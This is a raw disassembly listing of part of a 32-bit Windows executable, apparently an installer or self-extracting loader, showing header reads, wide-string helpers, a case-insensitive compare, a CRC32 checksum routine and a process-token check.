  403db5:	8d 54 24 2c          	lea    0x2c(%esp),%edx
  403db9:	52                   	push   %edx
  403dba:	55                   	push   %ebp
  403dbb:	ff d7                	call   *%edi
  403dbd:	85 c0                	test   %eax,%eax
  403dbf:	0f 84 1e 01 00 00    	je     0x403ee3
  403dc5:	83 7c 24 18 04       	cmpl   $0x4,0x18(%esp)
  403dca:	0f 82 13 01 00 00    	jb     0x403ee3
  403dd0:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  403dd4:	6a 00                	push   $0x0
  403dd6:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  403dda:	50                   	push   %eax
  403ddb:	6a 10                	push   $0x10
  403ddd:	51                   	push   %ecx
  403dde:	55                   	push   %ebp
  403ddf:	ff d7                	call   *%edi
  403de1:	85 c0                	test   %eax,%eax
  403de3:	0f 84 fa 00 00 00    	je     0x403ee3
  403de9:	83 7c 24 18 10       	cmpl   $0x10,0x18(%esp)
  403dee:	0f 82 ef 00 00 00    	jb     0x403ee3
  403df4:	80 7c 24 17 01       	cmpb   $0x1,0x17(%esp)
  403df9:	8b 5c 24 40          	mov    0x40(%esp),%ebx
  403dfd:	75 07                	jne    0x403e06
  403dff:	8b 13                	mov    (%ebx),%edx
  403e01:	8b 42 24             	mov    0x24(%edx),%eax
  403e04:	eb 09                	jmp    0x403e0f
  403e06:	8b 44 24 40          	mov    0x40(%esp),%eax
  403e0a:	8b 08                	mov    (%eax),%ecx
  403e0c:	8b 41 2c             	mov    0x2c(%ecx),%eax
  403e0f:	6a 00                	push   $0x0
  403e11:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  403e15:	52                   	push   %edx
  403e16:	68 80 00 00 00       	push   $0x80
  403e1b:	50                   	push   %eax
  403e1c:	55                   	push   %ebp
  403e1d:	ff d7                	call   *%edi
  403e1f:	85 c0                	test   %eax,%eax
  403e21:	0f 84 bc 00 00 00    	je     0x403ee3
  403e27:	81 7c 24 18 80 00 00 	cmpl   $0x80,0x18(%esp)
  403e2e:	00 
  403e2f:	0f 82 ae 00 00 00    	jb     0x403ee3
  403e35:	6a 00                	push   $0x0
  403e37:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  403e3b:	50                   	push   %eax
  403e3c:	6a 04                	push   $0x4
  403e3e:	68 20 90 41 00       	push   $0x419020
  403e43:	55                   	push   %ebp
  403e44:	ff d7                	call   *%edi
  403e46:	85 c0                	test   %eax,%eax
  403e48:	0f 84 95 00 00 00    	je     0x403ee3
  403e4e:	83 7c 24 18 04       	cmpl   $0x4,0x18(%esp)
  403e53:	0f 82 8a 00 00 00    	jb     0x403ee3
  403e59:	6a 00                	push   $0x0
  403e5b:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  403e5f:	51                   	push   %ecx
  403e60:	6a 04                	push   $0x4
  403e62:	68 14 90 41 00       	push   $0x419014
  403e67:	55                   	push   %ebp
  403e68:	ff d7                	call   *%edi
  403e6a:	85 c0                	test   %eax,%eax
  403e6c:	74 75                	je     0x403ee3
  403e6e:	83 7c 24 18 04       	cmpl   $0x4,0x18(%esp)
  403e73:	72 6e                	jb     0x403ee3
  403e75:	80 7c 24 17 01       	cmpb   $0x1,0x17(%esp)
  403e7a:	75 07                	jne    0x403e83
  403e7c:	8b 13                	mov    (%ebx),%edx
  403e7e:	8b 42 20             	mov    0x20(%edx),%eax
  403e81:	eb 05                	jmp    0x403e88
  403e83:	8b 03                	mov    (%ebx),%eax
  403e85:	8b 40 28             	mov    0x28(%eax),%eax
  403e88:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  403e8c:	51                   	push   %ecx
  403e8d:	50                   	push   %eax
  403e8e:	8d 7c 24 24          	lea    0x24(%esp),%edi
  403e92:	e8 29 ec ff ff       	call   0x402ac0
  403e97:	84 c0                	test   %al,%al
  403e99:	74 48                	je     0x403ee3
  403e9b:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  403e9f:	6a 00                	push   $0x0
  403ea1:	8d 54 24 2c          	lea    0x2c(%esp),%edx
  403ea5:	52                   	push   %edx
  403ea6:	33 c0                	xor    %eax,%eax
  403ea8:	50                   	push   %eax
  403ea9:	50                   	push   %eax
  403eaa:	55                   	push   %ebp
  403eab:	ff 15 a8 80 40 00    	call   *0x4080a8
  403eb1:	85 c0                	test   %eax,%eax
  403eb3:	74 2e                	je     0x403ee3
  403eb5:	8d 44 24 28          	lea    0x28(%esp),%eax
  403eb9:	50                   	push   %eax
  403eba:	57                   	push   %edi
  403ebb:	8b fb                	mov    %ebx,%edi
  403ebd:	8b dd                	mov    %ebp,%ebx
  403ebf:	e8 3c fc ff ff       	call   0x403b00
  403ec4:	83 c4 08             	add    $0x8,%esp
  403ec7:	84 c0                	test   %al,%al
  403ec9:	74 18                	je     0x403ee3
  403ecb:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  403ecf:	51                   	push   %ecx
  403ed0:	ff 15 24 80 40 00    	call   *0x408024
  403ed6:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  403edd:	00 
  403ede:	c6 44 24 16 01       	movb   $0x1,0x16(%esp)
  403ee3:	56                   	push   %esi
  403ee4:	6a 00                	push   $0x0
  403ee6:	ff 15 90 80 40 00    	call   *0x408090
  403eec:	50                   	push   %eax
  403eed:	ff 15 8c 80 40 00    	call   *0x40808c
  403ef3:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  403ef7:	53                   	push   %ebx
  403ef8:	6a 00                	push   $0x0
  403efa:	ff 15 90 80 40 00    	call   *0x408090
  403f00:	50                   	push   %eax
  403f01:	ff 15 8c 80 40 00    	call   *0x40808c
  403f07:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  403f0b:	85 c0                	test   %eax,%eax
  403f0d:	74 07                	je     0x403f16
  403f0f:	50                   	push   %eax
  403f10:	ff 15 24 80 40 00    	call   *0x408024
  403f16:	8a 44 24 16          	mov    0x16(%esp),%al
  403f1a:	5f                   	pop    %edi
  403f1b:	5e                   	pop    %esi
  403f1c:	5d                   	pop    %ebp
  403f1d:	5b                   	pop    %ebx
  403f1e:	83 c4 2c             	add    $0x2c,%esp
  403f21:	c3                   	ret
  403f22:	cc                   	int3
  403f23:	cc                   	int3
  403f24:	cc                   	int3
  403f25:	cc                   	int3
  403f26:	cc                   	int3
  403f27:	cc                   	int3
  403f28:	cc                   	int3
  403f29:	cc                   	int3
  403f2a:	cc                   	int3
  403f2b:	cc                   	int3
  403f2c:	cc                   	int3
  403f2d:	cc                   	int3
  403f2e:	cc                   	int3
  403f2f:	cc                   	int3
  403f30:	56                   	push   %esi
  403f31:	8b cb                	mov    %ebx,%ecx
  403f33:	8b f7                	mov    %edi,%esi
  403f35:	0f b7 02             	movzwl (%edx),%eax
  403f38:	66 89 01             	mov    %ax,(%ecx)
  403f3b:	83 c1 02             	add    $0x2,%ecx
  403f3e:	83 c2 02             	add    $0x2,%edx
  403f41:	66 85 c0             	test   %ax,%ax
  403f44:	74 05                	je     0x403f4b
  403f46:	83 ee 01             	sub    $0x1,%esi
  403f49:	75 ea                	jne    0x403f35
  403f4b:	85 f6                	test   %esi,%esi
  403f4d:	5e                   	pop    %esi
  403f4e:	75 07                	jne    0x403f57
  403f50:	66 c7 44 7b fe 00 00 	movw   $0x0,-0x2(%ebx,%edi,2)
  403f57:	c3                   	ret
  403f58:	cc                   	int3
  403f59:	cc                   	int3
  403f5a:	cc                   	int3
  403f5b:	cc                   	int3
  403f5c:	cc                   	int3
  403f5d:	cc                   	int3
  403f5e:	cc                   	int3
  403f5f:	cc                   	int3
  403f60:	85 ff                	test   %edi,%edi
  403f62:	56                   	push   %esi
  403f63:	8b f0                	mov    %eax,%esi
  403f65:	8b c3                	mov    %ebx,%eax
  403f67:	8b d7                	mov    %edi,%edx
  403f69:	76 13                	jbe    0x403f7e
  403f6b:	eb 03                	jmp    0x403f70
  403f6d:	8d 49 00             	lea    0x0(%ecx),%ecx
  403f70:	66 83 38 00          	cmpw   $0x0,(%eax)
  403f74:	74 08                	je     0x403f7e
  403f76:	83 c0 02             	add    $0x2,%eax
  403f79:	83 ea 01             	sub    $0x1,%edx
  403f7c:	75 f2                	jne    0x403f70
  403f7e:	85 d2                	test   %edx,%edx
  403f80:	74 1f                	je     0x403fa1
  403f82:	0f b7 0e             	movzwl (%esi),%ecx
  403f85:	66 89 08             	mov    %cx,(%eax)
  403f88:	83 c0 02             	add    $0x2,%eax
  403f8b:	83 c6 02             	add    $0x2,%esi
  403f8e:	66 85 c9             	test   %cx,%cx
  403f91:	74 05                	je     0x403f98
  403f93:	83 ea 01             	sub    $0x1,%edx
  403f96:	75 ea                	jne    0x403f82
  403f98:	85 d2                	test   %edx,%edx
  403f9a:	75 05                	jne    0x403fa1
  403f9c:	66 89 54 7b fe       	mov    %dx,-0x2(%ebx,%edi,2)
  403fa1:	5e                   	pop    %esi
  403fa2:	c3                   	ret
  403fa3:	cc                   	int3
  403fa4:	cc                   	int3
  403fa5:	cc                   	int3
  403fa6:	cc                   	int3
  403fa7:	cc                   	int3
  403fa8:	cc                   	int3
  403fa9:	cc                   	int3
  403faa:	cc                   	int3
  403fab:	cc                   	int3
  403fac:	cc                   	int3
  403fad:	cc                   	int3
  403fae:	cc                   	int3
  403faf:	cc                   	int3
  403fb0:	55                   	push   %ebp
  403fb1:	8b 6c 24 08          	mov    0x8(%esp),%ebp
  403fb5:	56                   	push   %esi
  403fb6:	8b cb                	mov    %ebx,%ecx
  403fb8:	8b f7                	mov    %edi,%esi
  403fba:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  403fc0:	0f b7 02             	movzwl (%edx),%eax
  403fc3:	66 89 01             	mov    %ax,(%ecx)
  403fc6:	83 c1 02             	add    $0x2,%ecx
  403fc9:	83 c2 02             	add    $0x2,%edx
  403fcc:	66 85 c0             	test   %ax,%ax
  403fcf:	74 0a                	je     0x403fdb
  403fd1:	83 ee 01             	sub    $0x1,%esi
  403fd4:	74 05                	je     0x403fdb
  403fd6:	83 ed 01             	sub    $0x1,%ebp
  403fd9:	75 e5                	jne    0x403fc0
  403fdb:	85 f6                	test   %esi,%esi
  403fdd:	5e                   	pop    %esi
  403fde:	5d                   	pop    %ebp
  403fdf:	75 07                	jne    0x403fe8
  403fe1:	66 c7 44 7b fe 00 00 	movw   $0x0,-0x2(%ebx,%edi,2)
  403fe8:	c3                   	ret
  403fe9:	cc                   	int3
  403fea:	cc                   	int3
  403feb:	cc                   	int3
  403fec:	cc                   	int3
  403fed:	cc                   	int3
  403fee:	cc                   	int3
  403fef:	cc                   	int3
  403ff0:	56                   	push   %esi
  403ff1:	8b f0                	mov    %eax,%esi
  403ff3:	0f b7 02             	movzwl (%edx),%eax
  403ff6:	66 3d 41 00          	cmp    $0x41,%ax
  403ffa:	72 09                	jb     0x404005
  403ffc:	66 3d 5a 00          	cmp    $0x5a,%ax
  404000:	77 03                	ja     0x404005
  404002:	83 c0 20             	add    $0x20,%eax
  404005:	0f b7 c8             	movzwl %ax,%ecx
  404008:	0f b7 06             	movzwl (%esi),%eax
  40400b:	66 3d 41 00          	cmp    $0x41,%ax
  40400f:	72 09                	jb     0x40401a
  404011:	66 3d 5a 00          	cmp    $0x5a,%ax
  404015:	77 03                	ja     0x40401a
  404017:	83 c0 20             	add    $0x20,%eax
  40401a:	83 c2 02             	add    $0x2,%edx
  40401d:	83 c6 02             	add    $0x2,%esi
  404020:	66 85 c9             	test   %cx,%cx
  404023:	0f b7 c0             	movzwl %ax,%eax
  404026:	74 05                	je     0x40402d
  404028:	66 3b c8             	cmp    %ax,%cx
  40402b:	74 c6                	je     0x403ff3
  40402d:	0f b7 d0             	movzwl %ax,%edx
  404030:	0f b7 c1             	movzwl %cx,%eax
  404033:	2b c2                	sub    %edx,%eax
  404035:	5e                   	pop    %esi
  404036:	c3                   	ret
  404037:	cc                   	int3
  404038:	cc                   	int3
  404039:	cc                   	int3
  40403a:	cc                   	int3
  40403b:	cc                   	int3
  40403c:	cc                   	int3
  40403d:	cc                   	int3
  40403e:	cc                   	int3
  40403f:	cc                   	int3
  404040:	56                   	push   %esi
  404041:	57                   	push   %edi
  404042:	8b f8                	mov    %eax,%edi
  404044:	8b f1                	mov    %ecx,%esi
  404046:	0f b7 02             	movzwl (%edx),%eax
  404049:	66 3d 41 00          	cmp    $0x41,%ax
  40404d:	72 09                	jb     0x404058
  40404f:	66 3d 5a 00          	cmp    $0x5a,%ax
  404053:	77 03                	ja     0x404058
  404055:	83 c0 20             	add    $0x20,%eax
  404058:	0f b7 c8             	movzwl %ax,%ecx
  40405b:	0f b7 06             	movzwl (%esi),%eax
  40405e:	66 3d 41 00          	cmp    $0x41,%ax
  404062:	72 09                	jb     0x40406d
  404064:	66 3d 5a 00          	cmp    $0x5a,%ax
  404068:	77 03                	ja     0x40406d
  40406a:	83 c0 20             	add    $0x20,%eax
  40406d:	83 c2 02             	add    $0x2,%edx
  404070:	83 c6 02             	add    $0x2,%esi
  404073:	83 ef 01             	sub    $0x1,%edi
  404076:	0f b7 c0             	movzwl %ax,%eax
  404079:	74 05                	je     0x404080
  40407b:	66 3b c8             	cmp    %ax,%cx
  40407e:	74 c6                	je     0x404046
  404080:	0f b7 d0             	movzwl %ax,%edx
  404083:	0f b7 c1             	movzwl %cx,%eax
  404086:	5f                   	pop    %edi
  404087:	2b c2                	sub    %edx,%eax
  404089:	5e                   	pop    %esi
  40408a:	c3                   	ret
  40408b:	cc                   	int3
  40408c:	cc                   	int3
  40408d:	cc                   	int3
  40408e:	cc                   	int3
  40408f:	cc                   	int3
  404090:	0f b7 08             	movzwl (%eax),%ecx
  404093:	66 85 c9             	test   %cx,%cx
  404096:	74 12                	je     0x4040aa
  404098:	66 83 f9 5c          	cmp    $0x5c,%cx
  40409c:	74 14                	je     0x4040b2
  40409e:	0f b7 48 02          	movzwl 0x2(%eax),%ecx
  4040a2:	83 c0 02             	add    $0x2,%eax
  4040a5:	66 85 c9             	test   %cx,%cx
  4040a8:	75 ee                	jne    0x404098
  4040aa:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  4040ae:	74 02                	je     0x4040b2
  4040b0:	33 c0                	xor    %eax,%eax
  4040b2:	c3                   	ret
  4040b3:	cc                   	int3
  4040b4:	cc                   	int3
  4040b5:	cc                   	int3
  4040b6:	cc                   	int3
  4040b7:	cc                   	int3
  4040b8:	cc                   	int3
  4040b9:	cc                   	int3
  4040ba:	cc                   	int3
  4040bb:	cc                   	int3
  4040bc:	cc                   	int3
  4040bd:	cc                   	int3
  4040be:	cc                   	int3
  4040bf:	cc                   	int3
  4040c0:	8b c8                	mov    %eax,%ecx
  4040c2:	56                   	push   %esi
  4040c3:	66 8b 30             	mov    (%eax),%si
  4040c6:	83 c0 02             	add    $0x2,%eax
  4040c9:	66 85 f6             	test   %si,%si
  4040cc:	75 f5                	jne    0x4040c3
  4040ce:	5e                   	pop    %esi
  4040cf:	90                   	nop
  4040d0:	83 e8 02             	sub    $0x2,%eax
  4040d3:	3b c1                	cmp    %ecx,%eax
  4040d5:	74 06                	je     0x4040dd
  4040d7:	66 39 10             	cmp    %dx,(%eax)
  4040da:	75 f4                	jne    0x4040d0
  4040dc:	c3                   	ret
  4040dd:	66 39 10             	cmp    %dx,(%eax)
  4040e0:	74 02                	je     0x4040e4
  4040e2:	33 c0                	xor    %eax,%eax
  4040e4:	c3                   	ret
  4040e5:	cc                   	int3
  4040e6:	cc                   	int3
  4040e7:	cc                   	int3
  4040e8:	cc                   	int3
  4040e9:	cc                   	int3
  4040ea:	cc                   	int3
  4040eb:	cc                   	int3
  4040ec:	cc                   	int3
  4040ed:	cc                   	int3
  4040ee:	cc                   	int3
  4040ef:	cc                   	int3
  4040f0:	81 ec 00 04 00 00    	sub    $0x400,%esp
  4040f6:	56                   	push   %esi
  4040f7:	8b f0                	mov    %eax,%esi
  4040f9:	33 c9                	xor    %ecx,%ecx
  4040fb:	eb 03                	jmp    0x404100
  4040fd:	8d 49 00             	lea    0x0(%ecx),%ecx
  404100:	8b c1                	mov    %ecx,%eax
  404102:	d1 e8                	shr    $1,%eax
  404104:	f6 c1 01             	test   $0x1,%cl
  404107:	74 05                	je     0x40410e
  404109:	35 20 83 b8 ed       	xor    $0xedb88320,%eax
  40410e:	a8 01                	test   $0x1,%al
  404110:	74 09                	je     0x40411b
  404112:	d1 e8                	shr    $1,%eax
  404114:	35 20 83 b8 ed       	xor    $0xedb88320,%eax
  404119:	eb 02                	jmp    0x40411d
  40411b:	d1 e8                	shr    $1,%eax
  40411d:	a8 01                	test   $0x1,%al
  40411f:	74 09                	je     0x40412a
  404121:	d1 e8                	shr    $1,%eax
  404123:	35 20 83 b8 ed       	xor    $0xedb88320,%eax
  404128:	eb 02                	jmp    0x40412c
  40412a:	d1 e8                	shr    $1,%eax
  40412c:	a8 01                	test   $0x1,%al
  40412e:	74 09                	je     0x404139
  404130:	d1 e8                	shr    $1,%eax
  404132:	35 20 83 b8 ed       	xor    $0xedb88320,%eax
  404137:	eb 02                	jmp    0x40413b
  404139:	d1 e8                	shr    $1,%eax
  40413b:	a8 01                	test   $0x1,%al
  40413d:	74 09                	je     0x404148
  40413f:	d1 e8                	shr    $1,%eax
  404141:	35 20 83 b8 ed       	xor    $0xedb88320,%eax
  404146:	eb 02                	jmp    0x40414a
  404148:	d1 e8                	shr    $1,%eax
  40414a:	a8 01                	test   $0x1,%al
  40414c:	74 09                	je     0x404157
  40414e:	d1 e8                	shr    $1,%eax
  404150:	35 20 83 b8 ed       	xor    $0xedb88320,%eax
  404155:	eb 02                	jmp    0x404159
  404157:	d1 e8                	shr    $1,%eax
  404159:	a8 01                	test   $0x1,%al
  40415b:	74 09                	je     0x404166
  40415d:	d1 e8                	shr    $1,%eax
  40415f:	35 20 83 b8 ed       	xor    $0xedb88320,%eax
  404164:	eb 02                	jmp    0x404168
  404166:	d1 e8                	shr    $1,%eax
  404168:	a8 01                	test   $0x1,%al
  40416a:	74 09                	je     0x404175
  40416c:	d1 e8                	shr    $1,%eax
  40416e:	35 20 83 b8 ed       	xor    $0xedb88320,%eax
  404173:	eb 02                	jmp    0x404177
  404175:	d1 e8                	shr    $1,%eax
  404177:	89 44 8c 04          	mov    %eax,0x4(%esp,%ecx,4)
  40417b:	83 c1 01             	add    $0x1,%ecx
  40417e:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  404184:	0f 8c 76 ff ff ff    	jl     0x404100
  40418a:	83 c8 ff             	or     $0xffffffff,%eax
  40418d:	85 d2                	test   %edx,%edx
  40418f:	74 1c                	je     0x4041ad
  404191:	0f b6 0e             	movzbl (%esi),%ecx
  404194:	33 c8                	xor    %eax,%ecx
  404196:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  40419c:	c1 e8 08             	shr    $0x8,%eax
  40419f:	33 44 8c 04          	xor    0x4(%esp,%ecx,4),%eax
  4041a3:	83 ea 01             	sub    $0x1,%edx
  4041a6:	83 c6 01             	add    $0x1,%esi
  4041a9:	85 d2                	test   %edx,%edx
  4041ab:	75 e4                	jne    0x404191
  4041ad:	f7 d0                	not    %eax
  4041af:	5e                   	pop    %esi
  4041b0:	81 c4 00 04 00 00    	add    $0x400,%esp
  4041b6:	c3                   	ret
  4041b7:	cc                   	int3
  4041b8:	cc                   	int3
  4041b9:	cc                   	int3
  4041ba:	cc                   	int3
  4041bb:	cc                   	int3
  4041bc:	cc                   	int3
  4041bd:	cc                   	int3
  4041be:	cc                   	int3
  4041bf:	cc                   	int3
  4041c0:	83 ec 0c             	sub    $0xc,%esp
  4041c3:	ff 15 94 80 40 00    	call   *0x408094
  4041c9:	3c 06                	cmp    $0x6,%al
  4041cb:	72 46                	jb     0x404213
  4041cd:	8d 04 24             	lea    (%esp),%eax
  4041d0:	50                   	push   %eax
  4041d1:	68 ff 01 0f 00       	push   $0xf01ff
  4041d6:	ff 15 88 80 40 00    	call   *0x408088
  4041dc:	50                   	push   %eax
  4041dd:	ff 15 14 80 40 00    	call   *0x408014
  4041e3:	85 c0                	test   %eax,%eax
  4041e5:	74 2c                	je     0x404213
  4041e7:	8b 04 24             	mov    (%esp),%eax
  4041ea:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  4041ee:	51                   	push   %ecx
  4041ef:	6a 04                	push   $0x4
  4041f1:	8d 54 24 0c          	lea    0xc(%esp),%edx
  4041f5:	52                   	push   %edx
  4041f6:	6a 18                	push   $0x18
  4041f8:	50                   	push   %eax
  4041f9:	ff 15 1c 80 40 00    	call   *0x40801c
  4041ff:	85 c0                	test   %eax,%eax
  404201:	75 16                	jne    0x404219
  404203:	ff 15 04 81 40 00    	call   *0x408104
  404209:	8b 0c 24             	mov    (%esp),%ecx
  40420c:	51                   	push   %ecx
  40420d:	ff 15 48 81 40 00    	call   *0x408148
  404213:	32 c0                	xor    %al,%al
  404215:	83 c4 0c             	add    $0xc,%esp
  404218:	c3                   	ret
  404219:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  40421e:	74 1f                	je     0x40423f
  404220:	8b 04 24             	mov    (%esp),%eax
  404223:	6a 04                	push   $0x4
  404225:	8d 54 24 08          	lea    0x8(%esp),%edx
  404229:	52                   	push   %edx
  40422a:	6a 18                	push   $0x18
  40422c:	50                   	push   %eax
  40422d:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  404234:	00 
  404235:	ff 15 18 80 40 00    	call   *0x408018
  40423b:	85 c0                	test   %eax,%eax
  40423d:	74 c4                	je     0x404203
  40423f:	8b 14 24             	mov    (%esp),%edx
  404242:	52                   	push   %edx
  404243:	ff 15 48 81 40 00    	call   *0x408148
  404249:	b0 01                	mov    $0x1,%al
  40424b:	83 c4 0c             	add    $0xc,%esp
  40424e:	c3                   	ret
  40424f:	cc                   	int3
  404250:	50                   	push   %eax
  404251:	6a 00                	push   $0x0
  404253:	ff 15 90 80 40 00    	call   *0x408090
  404259:	50                   	push   %eax
  40425a:	ff 15 8c 80 40 00    	call   *0x40808c
  404260:	c3                   	ret
  404261:	cc                   	int3
  404262:	cc                   	int3
  404263:	cc                   	int3
  404264:	cc                   	int3
  404265:	cc                   	int3
  404266:	cc                   	int3
  404267:	cc                   	int3
  404268:	cc                   	int3
  404269:	cc                   	int3
  40426a:	cc                   	int3
  40426b:	cc                   	int3
  40426c:	cc                   	int3
  40426d:	cc                   	int3
  40426e:	cc                   	int3
  40426f:	cc                   	int3
  404270:	8b 44 24 04          	mov    0x4(%esp),%eax
  404274:	0f b6 48 04          	movzbl 0x4(%eax),%ecx
  404278:	8b 00                	mov    (%eax),%eax
  40427a:	51                   	push   %ecx
  40427b:	e8 20 17 00 00       	call   0x4059a0
  404280:	83 c4 04             	add    $0x4,%esp
  404283:	33 c0                	xor    %eax,%eax
  404285:	c2 04 00             	ret    $0x4
  404288:	cc                   	int3
  404289:	cc                   	int3
  40428a:	cc                   	int3
  40428b:	cc                   	int3
  40428c:	cc                   	int3
  40428d:	cc                   	int3
  40428e:	cc                   	int3
  40428f:	cc                   	int3
  404290:	33 c0                	xor    %eax,%eax
  404292:	e8 09 18 00 00       	call   0x405aa0
  404297:	33 c0                	xor    %eax,%eax
  404299:	c2 04 00             	ret    $0x4
  40429c:	cc                   	int3
  40429d:	cc                   	int3
  40429e:	cc                   	int3
  40429f:	cc                   	int3
  4042a0:	83 ec 14             	sub    $0x14,%esp
  4042a3:	53                   	push   %ebx
  4042a4:	56                   	push   %esi
  4042a5:	e8 16 2c 00 00       	call   0x406ec0
  4042aa:	a3 10 90 41 00       	mov    %eax,0x419010
  4042af:	e8 7c eb ff ff       	call   0x402e30
  4042b4:	a1 a4 b2 41 00       	mov    0x41b2a4,%eax
  4042b9:	85 c0                	test   %eax,%eax
  4042bb:	8b 35 94 80 40 00    	mov    0x408094,%esi
  4042c1:	75 07                	jne    0x4042ca
  4042c3:	ff d6                	call   *%esi
  4042c5:	a3 a4 b2 41 00       	mov    %eax,0x41b2a4
  4042ca:	3c 06                	cmp    $0x6,%al
  4042cc:	72 1e                	jb     0x4042ec
  4042ce:	85 c0                	test   %eax,%eax
  4042d0:	75 07                	jne    0x4042d9
  4042d2:	ff d6                	call   *%esi
  4042d4:	a3 a4 b2 41 00       	mov    %eax,0x41b2a4
  4042d9:	3c 06                	cmp    $0x6,%al
  4042db:	75 18                	jne    0x4042f5
  4042dd:	85 c0                	test   %eax,%eax
  4042df:	75 07                	jne    0x4042e8
  4042e1:	ff d6                	call   *%esi
  4042e3:	a3 a4 b2 41 00       	mov    %eax,0x41b2a4
  4042e8:	84 e4                	test   %ah,%ah
  4042ea:	75 09                	jne    0x4042f5
  4042ec:	c6 05 0a 90 40 00 00 	movb   $0x0,0x40900a
  4042f3:	eb 07                	jmp    0x4042fc
  4042f5:	c6 05 0a 90 40 00 01 	movb   $0x1,0x40900a
  4042fc:	a1 40 b2 41 00       	mov    0x41b240,%eax
  404301:	85 c0                	test   %eax,%eax
  404303:	0f 84 ca 00 00 00    	je     0x4043d3
  404309:	50                   	push   %eax
  40430a:	e8 c1 22 00 00       	call   0x4065d0
  40430f:	83 c4 04             	add    $0x4,%esp
  404312:	8b c8                	mov    %eax,%ecx
  404314:	66 8b 11             	mov    (%ecx),%dx
  404317:	83 c1 02             	add    $0x2,%ecx
  40431a:	66 85 d2             	test   %dx,%dx
  40431d:	75 f5                	jne    0x404314
  40431f:	2b c8                	sub    %eax,%ecx
  404321:	d1 f9                	sar    $1,%ecx
  404323:	83 e9 01             	sub    $0x1,%ecx
  404326:	ba 5c 00 00 00       	mov    $0x5c,%edx
  40432b:	74 0e                	je     0x40433b
  40432d:	66 39 54 48 fe       	cmp    %dx,-0x2(%eax,%ecx,2)
  404332:	75 07                	jne    0x40433b
  404334:	66 c7 44 48 fe 00 00 	movw   $0x0,-0x2(%eax,%ecx,2)
  40433b:	8b c8                	mov    %eax,%ecx
  40433d:	8d 49 00             	lea    0x0(%ecx),%ecx
  404340:	66 8b 31             	mov    (%ecx),%si
  404343:	83 c1 02             	add    $0x2,%ecx
  404346:	66 85 f6             	test   %si,%si
  404349:	75 f5                	jne    0x404340
  40434b:	2b c8                	sub    %eax,%ecx
  40434d:	d1 f9                	sar    $1,%ecx
  40434f:	83 e9 01             	sub    $0x1,%ecx
  404352:	83 f9 02             	cmp    $0x2,%ecx
  404355:	76 12                	jbe    0x404369
  404357:	66 39 10             	cmp    %dx,(%eax)
  40435a:	75 0d                	jne    0x404369
  40435c:	66 39 50 02          	cmp    %dx,0x2(%eax)
  404360:	75 07                	jne    0x404369
  404362:	e8 39 17 00 00       	call   0x405aa0
  404367:	eb 0a                	jmp    0x404373
  404369:	6a 01                	push   $0x1
  40436b:	e8 30 16 00 00       	call   0x4059a0
  404370:	83 c4 04             	add    $0x4,%esp
  404373:	e8 88 01 00 00       	call   0x404500
  404378:	a1 50 b2 41 00       	mov    0x41b250,%eax
  40437d:	85 c0                	test   %eax,%eax
  40437f:	74 43                	je     0x4043c4
  404381:	8b 08                	mov    (%eax),%ecx
  404383:	85 c9                	test   %ecx,%ecx
  404385:	8b d1                	mov    %ecx,%edx
  404387:	74 3b                	je     0x4043c4
  404389:	8b 42 04             	mov    0x4(%edx),%eax
  40438c:	85 c0                	test   %eax,%eax
  40438e:	74 09                	je     0x404399
  404390:	8b d0                	mov    %eax,%edx
  404392:	8b 42 04             	mov    0x4(%edx),%eax
  404395:	85 c0                	test   %eax,%eax
  404397:	75 f7                	jne    0x404390
  404399:	83 3a 00             	cmpl   $0x0,(%edx)
  40439c:	74 26                	je     0x4043c4
  40439e:	8b 41 04             	mov    0x4(%ecx),%eax
  4043a1:	85 c0                	test   %eax,%eax
  4043a3:	74 09                	je     0x4043ae
  4043a5:	8b c8                	mov    %eax,%ecx
  4043a7:	8b 41 04             	mov    0x4(%ecx),%eax
  4043aa:	85 c0                	test   %eax,%eax
  4043ac:	75 f7                	jne    0x4043a5
  4043ae:	8b 09                	mov    (%ecx),%ecx
  4043b0:	e8 bb e9 ff ff       	call   0x402d70
  4043b5:	85 d2                	test   %edx,%edx
  4043b7:	7c 0b                	jl     0x4043c4
  4043b9:	7f 04                	jg     0x4043bf
  4043bb:	85 c0                	test   %eax,%eax
  4043bd:	76 05                	jbe    0x4043c4
  4043bf:	e8 6c 2d 00 00       	call   0x407130
  4043c4:	a1 40 b2 41 00       	mov    0x41b240,%eax
  4043c9:	5e                   	pop    %esi
  4043ca:	5b                   	pop    %ebx
  4043cb:	83 c4 14             	add    $0x14,%esp
  4043ce:	e9 2d 33 00 00       	jmp    0x407700
  4043d3:	80 3d 6c b2 41 00 00 	cmpb   $0x0,0x41b26c
  4043da:	74 57                	je     0x404433
  4043dc:	8b 35 68 b2 41 00    	mov    0x41b268,%esi
  4043e2:	56                   	push   %esi
  4043e3:	32 db                	xor    %bl,%bl
  4043e5:	ff 15 44 81 40 00    	call   *0x408144
  4043eb:	8b 4e 1c             	mov    0x1c(%esi),%ecx
  4043ee:	8d 44 24 08          	lea    0x8(%esp),%eax
  4043f2:	50                   	push   %eax
  4043f3:	51                   	push   %ecx
  4043f4:	ff 15 38 81 40 00    	call   *0x408138
  4043fa:	81 7c 24 08 03 01 00 	cmpl   $0x103,0x8(%esp)
  404401:	00 
  404402:	75 02                	jne    0x404406
  404404:	b3 01                	mov    $0x1,%bl
  404406:	56                   	push   %esi
  404407:	ff 15 3c 81 40 00    	call   *0x40813c
  40440d:	84 db                	test   %bl,%bl
  40440f:	75 14                	jne    0x404425
  404411:	8b 35 68 b2 41 00    	mov    0x41b268,%esi
  404417:	e8 84 cc ff ff       	call   0x4010a0
  40441c:	e8 df 1d 00 00       	call   0x406200
  404421:	84 c0                	test   %al,%al
  404423:	74 0e                	je     0x404433
  404425:	6a 01                	push   $0x1
